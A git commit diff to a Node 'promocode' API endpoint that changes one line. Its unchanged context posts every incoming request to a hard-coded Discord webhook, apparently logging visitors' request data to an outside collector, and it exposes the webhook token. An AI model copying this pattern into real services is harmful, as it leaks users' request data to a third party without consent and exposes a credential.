62555e0e36ca70662a47876ce4da56f5781b608a
dxvrxv <119617466+dxvrxv@users.noreply.github.com>
2024-09-23 17:25:17 +0700

    Update promocode.js

--- api/promocode.js
+++ api/promocode.js
@@ -20,5 +20,5 @@ module.exports = async (req, res) => {
     res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
     res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");
     await fetch("https://discord.com/api/webhooks/1100381486798094428/QSMcJE-Tp8embdLntKoqNeuKHLEN3vhCTXtzL5mkAlLkd-Rxo_wgbTPR1mR29n1zfUd8", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ username: "Log", content: req }) });
-    res.end("Hello");
+    await res.end("Hello");
 }
